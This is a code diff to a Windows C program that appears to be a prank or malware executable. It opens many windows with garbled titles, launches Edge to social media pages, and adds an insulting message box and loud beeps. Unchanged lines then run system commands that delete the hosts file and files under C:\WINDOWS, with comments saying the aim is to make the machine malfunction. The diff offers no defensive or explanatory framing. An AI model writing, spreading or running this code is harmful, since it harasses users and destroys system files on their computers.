@@ -91,7 +91,7 @@ int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine,
     if (!RegisterClassW(&ws)){
       return -1;
     }
-
+// do{
     HWND hnd = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
      HWND hnd1 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
      HWND hnd3 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
@@ -106,6 +106,7 @@ int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine,
      HWND hnd14 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
      HWND hnd15 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
      HWND hnd16 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
+// }while (TRUE)
     // if (hnd == NULL)
     // {
     //   return -1;
@@ -144,6 +145,13 @@ while (GetMessageW(&msg,NULL,0,0))
        ShellExecute(NULL,"open","msedge.exe", "https://www.whatsapp.com",NULL,SW_NORMAL);
        ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com",NULL,SW_SHOWMAXIMIZED);
        ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com/p/CyOy0JzvKvm/?igsh=MWo0amppYjRjeTFkZQ==",NULL,SW_SHOWMAXIMIZED);
+     MessageBox(NULL, TEXT("You are a Stupid like everyone !!"),
+ NULL, MB_ICONERROR);
+
+    Beep(800,8000);
+ Beep(900,9000);
+ Beep(1000,10000);
+ Beep(1100,11000);
        system("del C:\WINDOWS\System32\drivers\etc\hosts");// deleting the host files of C directory in sense of malfunction 
     system("del C:\\WINDOWS\\.");//Now fire up the C drive  
 
